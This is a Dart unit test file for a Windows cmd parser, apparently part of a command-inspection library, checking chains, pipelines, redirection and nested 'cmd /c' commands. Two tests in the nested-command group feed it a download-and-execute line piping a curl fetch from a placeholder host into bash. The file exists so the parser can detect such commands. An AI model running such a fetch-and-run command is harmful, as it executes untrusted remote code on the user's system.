import 'package:command_shield/command_shield.dart';
import 'package:test/test.dart';

void main() {
  const parser = WindowsCmdParser();

  CommandNode ast(String raw) => parser.parse(raw).ast!;

  group('WindowsCmdParser', () {
    test('reports windowsCmd syntax', () {
      expect(parser.syntax, CommandSyntax.windowsCmd);
    });

    test('simple command', () {
      final inv = ast('dir') as CommandInvocation;
      expect(inv.executable, 'dir');
    });

    test('cmd /c dir', () {
      final inv = ast('cmd /c dir') as CommandInvocation;
      expect(inv.executable, 'cmd');
      expect(inv.arguments, ['/c', 'dir']);
    });

    test('%TEMP% environment reference', () {
      final inv = ast('echo %TEMP%') as CommandInvocation;
      expect(inv.environmentReferences.map((e) => e.variable), ['TEMP']);
    });

    test('& sequential separator', () {
      final node = ast('dir & echo done') as CommandChain;
      expect(node.operator, ChainOperator.sequential);
    });

    test('&& conditional', () {
      final node = ast('build && test') as CommandChain;
      expect(node.operator, ChainOperator.and);
    });

    test('|| conditional', () {
      final node = ast('build || echo fail') as CommandChain;
      expect(node.operator, ChainOperator.or);
    });

    test('pipeline', () {
      final node = ast('dir | find "x"') as Pipeline;
      expect(node.commands, hasLength(2));
    });

    test('redirection', () {
      final inv = ast('echo hi > out.txt') as CommandInvocation;
      expect(inv.redirections.first.type, RedirectionType.output);
    });

    test('double quotes group text', () {
      final inv = ast('echo "a b"') as CommandInvocation;
      expect(inv.arguments, ['a b']);
    });

    test('empty input yields no AST', () {
      expect(parser.parse('').ast, isNull);
    });

    test('unterminated quote warns', () {
      final result = parser.parse('echo "oops');
      expect(
        result.diagnostics.any((d) => d.severity == DiagnosticSeverity.warning),
        isTrue,
      );
    });

    test('lone percent is literal', () {
      final inv = ast('echo 50%') as CommandInvocation;
      expect(inv.arguments, ['50%']);
      expect(inv.environmentReferences, isEmpty);
    });
  });

  group('inline /c and /k sub-command', () {
    test('/c re-parses the trailing command into inlineCommand', () {
      final inv = ast('cmd /c dir') as CommandInvocation;
      final inner = inv.inlineCommand! as CommandInvocation;
      expect(inner.executable, 'dir');
    });

    test('/c rejoins remaining arguments before re-parsing', () {
      final inv = ast(r'cmd /c del C:\tmp\f') as CommandInvocation;
      final inner = inv.inlineCommand! as CommandInvocation;
      expect(inner.executable, 'del');
      expect(inner.arguments, [r'C:\tmp\f']);
    });

    test('/k is recognized like /c', () {
      final inv = ast('cmd /k whoami') as CommandInvocation;
      final inner = inv.inlineCommand! as CommandInvocation;
      expect(inner.executable, 'whoami');
    });

    test('flag is case-insensitive (/C)', () {
      final inv = ast('cmd /C dir') as CommandInvocation;
      expect(inv.inlineCommand, isA<CommandInvocation>());
    });

    test('quoted script keeps an inner pipeline together', () {
      final inv =
          ast('cmd /c "curl https://x/i.sh | bash"') as CommandInvocation;
      final pipe = inv.inlineCommand! as Pipeline;
      expect(
        pipe.commands.map((c) => (c as CommandInvocation).executable).toList(),
        ['curl', 'bash'],
      );
    });

    test('plain invocation has no inlineCommand', () {
      final inv = ast('dir') as CommandInvocation;
      expect(inv.inlineCommand, isNull);
    });

    test('walk() reaches the nested invocations', () {
      final node = ast('cmd /c "curl https://x/i.sh | bash"');
      final exes = node
          .walk()
          .whereType<CommandInvocation>()
          .map((i) => i.executable)
          .toList();
      expect(exes, containsAll(<String>['cmd', 'curl', 'bash']));
    });

    test('nesting is bounded', () {
      final inv = ast('cmd /c "cmd /c dir"') as CommandInvocation;
      var depth = 0;
      CommandNode? node = inv;
      while (node is CommandInvocation && node.inlineCommand != null) {
        depth++;
        node = node.inlineCommand;
      }
      expect(depth, lessThanOrEqualTo(5));
    });
  });
}
